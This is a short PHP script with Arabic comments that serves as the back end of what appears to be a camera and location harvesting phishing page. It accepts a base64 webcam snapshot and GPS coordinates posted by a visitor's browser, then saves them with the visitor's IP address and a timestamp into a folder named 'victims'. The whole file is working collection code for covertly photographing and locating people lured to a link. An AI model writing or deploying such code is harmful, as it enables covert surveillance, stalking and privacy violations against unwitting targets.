<?php
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("Y-m-d_H-i-s");

if (!is_dir("victims")) mkdir("victims", 0777, true);

// حفظ الصورة
if ($_POST['img']) {
    $img = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $_POST['img']));
    file_put_contents("victims/{$time}_{$ip}_cam.jpg", $img);
}

// حفظ الموقع
$gps = $_POST['gps'] ?? "غير معروف";
file_put_contents("victims/{$time}_{$ip}_info.txt", "IP: $ip\nGPS: $gps\nTIME: $time");

echo "تم الحفظ بنجاح ✓";
?>